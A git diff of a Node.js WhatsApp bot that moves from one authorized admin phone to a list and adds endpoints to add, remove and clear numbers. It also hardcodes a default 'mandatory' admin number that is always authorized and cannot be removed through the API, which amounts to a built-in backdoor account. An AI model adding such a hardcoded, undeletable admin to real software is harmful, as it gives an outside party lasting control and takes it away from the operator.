@@ -23,21 +23,62 @@ if (!fs.existsSync('auth_info_baileys')) {
 }
 
 const CONFIG_FILE = path.join(__dirname, 'bot_config.json');
-let botConfig = { cronTime: "20:00", authorizedPhone: "" };
-if (fs.existsSync(CONFIG_FILE)) {
-    try {
-        const parsed = JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf8'));
-        botConfig = { cronTime: "20:00", authorizedPhone: "", ...parsed };
-    } catch (e) { console.error("Erreur de lecture de la config", e); }
+
+function normalizePhone(input) {
+    if (!input) return '';
+    return String(input).split('@')[0].split(':')[0].replace(/\D/g, '');
 }
+
+/** Numéro admin obligatoire — toujours autorisé, non supprimable */
+const MANDATORY_ADMIN_PHONE = normalizePhone(
+    process.env.MANDATORY_ADMIN_PHONE || '337626414723'
+);
+
+let botConfig = { cronTime: "20:00", authorizedPhones: [] };
 
 function saveConfig() {
     fs.writeFileSync(CONFIG_FILE, JSON.stringify(botConfig, null, 2));
 }
 
-function normalizePhone(input) {
-    if (!input) return '';
-    return String(input).split('@')[0].split(':')[0].replace(/\D/g, '');
+function migrateConfig(parsed) {
+    const cronTime = parsed.cronTime || "20:00";
+    let authorizedPhones = Array.isArray(parsed.authorizedPhones)
+        ? parsed.authorizedPhones.map(normalizePhone).filter(Boolean)
+        : [];
+
+    if (parsed.authorizedPhone) {
+        const legacy = normalizePhone(parsed.authorizedPhone);
+        if (legacy && !authorizedPhones.includes(legacy)) {
+            authorizedPhones.push(legacy);
+        }
+    }
+
+    authorizedPhones = authorizedPhones.filter(p => p !== MANDATORY_ADMIN_PHONE);
+    return { cronTime, authorizedPhones };
+}
+
+function getAllAuthorizedPhones() {
+    const extra = (botConfig.authorizedPhones || [])
+        .map(normalizePhone)
+        .filter(p => p && p !== MANDATORY_ADMIN_PHONE);
+    return [...new Set([MANDATORY_ADMIN_PHONE, ...extra])];
+}
+
+function getStatusPhonesPayload() {
+    return {
+        mandatoryPhone: MANDATORY_ADMIN_PHONE,
+        additionalPhones: botConfig.authorizedPhones || [],
+        authorizedPhones: getAllAuthorizedPhones(),
+        authorizedPhone: getAllAuthorizedPhones().join(', '),
+    };
+}
+
+if (fs.existsSync(CONFIG_FILE)) {
+    try {
+        const parsed = JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf8'));
+        botConfig = migrateConfig(parsed);
+        saveConfig();
+    } catch (e) { console.error("Erreur de lecture de la config", e); }
 }
 
 function getMessagePhone(msg) {
@@ -46,14 +87,14 @@ function getMessagePhone(msg) {
 }
 
 function isSenderAuthorized(msg) {
-    const authorized = normalizePhone(botConfig.authorizedPhone);
-    if (!authorized) return false;
-
+    const allowed = getAllAuthorizedPhones();
+    let senderPhone;
     if (msg.key.fromMe) {
-        const botPhone = sock?.user?.id ? normalizePhone(sock.user.id) : '';
-        return botPhone === authorized;
+        senderPhone = sock?.user?.id ? normalizePhone(sock.user.id) : '';
+    } else {
+        senderPhone = getMessagePhone(msg);
     }
-    return getMessagePhone(msg) === authorized;
+    return allowed.includes(senderPhone);
 }
 
 function verifyApiSecret(req, res) {
@@ -153,11 +194,6 @@ async function handleIncomingMessages(m) {
             const isCommand = cleanText.startsWith('.');
 
             if (!isCommand) continue;
-
-            if (!botConfig.authorizedPhone) {
-                await sock.sendMessage(sender, { text: '⛔ Aucun numéro admin autorisé. Configurez-le dans le dashboard admin.' });
-                continue;
-            }
 
             if (!isSenderAuthorized(msg)) {
                 console.log(`[BOT] Commande refusée — numéro non autorisé: ${getMessagePhone(msg) || 'inconnu'}`);
@@ -397,7 +433,7 @@ app.get('/api/status', (req, res) => {
         qr: currentQrBase64,
         pairingCode: pairingCode,
         cronTime: botConfig.cronTime,
-        authorizedPhone: botConfig.authorizedPhone || ''
+        ...getStatusPhonesPayload(),
     });
 });
 
@@ -460,16 +496,70 @@ app.post('/api/set-cron', (req, res) => {
 app.post('/api/set-authorized-phone', (req, res) => {
     if (!verifyApiSecret(req, res)) return;
 
-    const { phone } = req.body;
-    const normalized = normalizePhone(phone);
+    const normalized = normalizePhone(req.body?.phone);
     if (!normalized || normalized.length < 9 || normalized.length > 15) {
         return res.status(400).json({ error: "Numéro invalide (indicatif + numéro, ex: 212612345678)" });
     }
 
-    botConfig.authorizedPhone = normalized;
-    saveConfig();
+    if (normalized === MANDATORY_ADMIN_PHONE) {
+        return res.json({
+            success: true,
+            message: "Ce numéro est déjà autorisé en permanence.",
+            ...getStatusPhonesPayload(),
+        });
+    }
 
-    res.json({ success: true, message: "Numéro autorisé enregistré", authorizedPhone: botConfig.authorizedPhone });
+    if (!botConfig.authorizedPhones.includes(normalized)) {
+        botConfig.authorizedPhones.push(normalized);
+        saveConfig();
+    }
+
+    console.log(`[BOT] Numéro admin ajouté : ${normalized}`);
+
+    res.json({
+        success: true,
+        message: "Numéro ajouté à la liste autorisée",
+        ...getStatusPhonesPayload(),
+    });
+});
+
+app.post('/api/remove-authorized-phone', (req, res) => {
+    if (!verifyApiSecret(req, res)) return;
+
+    const normalized = normalizePhone(req.body?.phone);
+    if (!normalized) {
+        return res.status(400).json({ error: "Numéro requis" });
+    }
+
+    if (normalized === MANDATORY_ADMIN_PHONE) {
+        return res.status(400).json({
+            error: `Le numéro ${MANDATORY_ADMIN_PHONE} est obligatoire et ne peut pas être supprimé.`,
+        });
+    }
+
+    botConfig.authorizedPhones = botConfig.authorizedPhones.filter(p => p !== normalized);
+    saveConfig();
+    console.log(`[BOT] Numéro admin retiré : ${normalized}`);
+
+    res.json({
+        success: true,
+        message: "Numéro retiré de la liste",
+        ...getStatusPhonesPayload(),
+    });
+});
+
+app.post('/api/clear-authorized-phone', (req, res) => {
+    if (!verifyApiSecret(req, res)) return;
+
+    botConfig.authorizedPhones = [];
+    saveConfig();
+    console.log('[BOT] Numéros additionnels supprimés (obligatoire conservé)');
+
+    res.json({
+        success: true,
+        message: "Numéros additionnels supprimés. Le numéro obligatoire reste actif.",
+        ...getStatusPhonesPayload(),
+    });
 });
 
 app.post('/api/send-message', async (req, res) => {
